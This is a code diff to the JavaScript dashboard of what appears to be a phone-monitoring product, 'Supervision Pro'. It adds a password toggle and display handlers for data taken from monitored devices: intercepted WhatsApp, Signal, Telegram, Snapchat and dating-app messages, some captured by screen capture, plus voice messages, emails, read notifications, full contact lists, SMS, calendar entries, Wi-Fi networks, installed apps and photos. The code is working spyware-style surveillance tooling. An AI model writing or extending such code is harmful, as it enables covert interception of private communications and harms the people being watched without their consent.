@@ -1,7 +1,8 @@
 /**
  * Supervision Pro – Dashboard Entreprise
  */
-const API = '';
+// Configuration API - en production, utilise l'origine actuelle
+const API = window.location.hostname === 'localhost' ? '' : '';
 let token = localStorage.getItem('sp_token');
 let allDevices = [], allEvents = [], ws = null, leafletMap = null, charts = {}, deviceScores = {};
 
@@ -53,6 +54,18 @@ function doLogin2FA(){
 }
 
 function logout(){token=null;localStorage.removeItem('sp_token');clearInactivityTimer();location.reload();}
+
+// Toggle password visibility
+function togglePassword(inputId, btn){
+  const input=document.getElementById(inputId);
+  if(input.type==='password'){
+    input.type='text';
+    btn.textContent='🙈';
+  }else{
+    input.type='password';
+    btn.textContent='👁️';
+  }
+}
 function authHeaders(){return{'Authorization':`Bearer ${token}`,'Content-Type':'application/json'};}
 function showApp(){document.getElementById('login-screen').style.display='none';document.getElementById('app').style.display='flex';initWS();loadAll();startInactivityTimer();}
 
@@ -233,7 +246,62 @@ function eventDetail(e){
   if(e.type==='sms_message'){
     return`📱 <strong>SMS ${esc(p.type||'')}</strong> — ${esc(p.contact||p.address||'')}: <em>"${esc((p.body||'').slice(0,200))}"</em>`;
   }
+  // Messages capturés (WhatsApp, Telegram, Snapchat, TikTok, Instagram, etc.)
+  if(e.type==='message_captured'){
+    const appIcons={'WhatsApp':'💬','Telegram':'✈️','Snapchat':'👻','Instagram':'📸','TikTok':'🎵','Messenger':'💭','Discord':'🎮','Signal':'🔒','Viber':'📞','LINE':'🟢','WeChat':'💚'};
+    const icon=appIcons[p.app]||'💬';
+    const sender=p.sender?`<strong>${esc(p.sender)}</strong>: `:'';
+    const conv=p.conversation?` [${esc(p.conversation)}]`:'';
+    const src=p.source==='screen_capture'?' 📱':'';
+    return`${icon} <strong>${esc(p.app||'')}</strong>${conv}${src} — ${sender}<em>"${esc((p.message||'').slice(0,300))}"</em>`;
+  }
+  // Conversation ouverte
+  if(e.type==='conversation_opened'){
+    const appIcons={'WhatsApp':'💬','Telegram':'✈️','Snapchat':'👻','Instagram':'📸','TikTok':'🎵','Messenger':'💭'};
+    const icon=appIcons[p.app]||'💬';
+    return`${icon} <strong>${esc(p.app||'')}</strong> — Conversation ouverte: <strong>${esc(p.conversation||'')}</strong> (${p.messageCount||0} messages)`;
+  }
+  // Email
+  if(e.type==='email_notification'){
+    return`📧 <strong>${esc(p.app||'Email')}</strong> — ${esc(p.sender||'')}: <em>"${esc((p.message||'').slice(0,200))}"</em>`;
+  }
+  // Dating apps
+  if(e.type==='dating_message'){
+    return`💕 <strong>${esc(p.app||'')}</strong> — ${esc(p.sender||'')}: <em>"${esc((p.message||'').slice(0,200))}"</em>`;
+  }
+  // Notification lue
+  if(e.type==='notification_read'){
+    return`✓ <strong>${esc(p.app||'')}</strong> — Notification lue`;
+  }
+  // Voice message
+  if(e.type==='voice_message'){
+    return`🎤 <strong>${esc(p.app||'')}</strong> — ${esc(p.sender||'')}: Message vocal`;
+  }
   if(e.type==='contacts_sync')return`👥 ${p.count||0} contacts synchronisés`;
+  if(e.type==='contacts_full')return`👥 <strong>${p.count||0} contacts</strong> synchronisés (complet)`;
+  // SMS batch
+  if(e.type==='sms_batch'){
+    return`📱 <strong>${p.count||0} SMS</strong> synchronisés`;
+  }
+  // Calendrier
+  if(e.type==='calendar_events'){
+    return`📅 <strong>${p.count||0} événements</strong> du calendrier`;
+  }
+  // WiFi
+  if(e.type==='wifi_connected'){
+    return`📶 Connecté à <strong>${esc(p.ssid||'')}</strong> (${p.rssi||'?'} dBm)`;
+  }
+  // Heartbeat amélioré
+  if(e.type==='heartbeat'){
+    const bat=p.batteryLevel!=null?`🔋 ${p.batteryLevel}%`:'';
+    const net=p.networkType?` | 📡 ${p.networkType}`:'';
+    const storage=p.storageUsedPercent?` | 💾 ${p.storageUsedPercent}%`:'';
+    return`${bat}${net}${storage}`;
+  }
+  // Apps installées
+  if(e.type==='apps_installed'){
+    return`📲 <strong>${p.count||0} apps</strong> installées`;
+  }
   if(e.type==='new_photo_detected'){
     const src=p.sourceApp||'galerie';
     return`📷 Nouvelle photo : <strong>${esc(p.filename||'')}</strong> (${src}) ${p.isScreenshot?'— Screenshot':''}`;
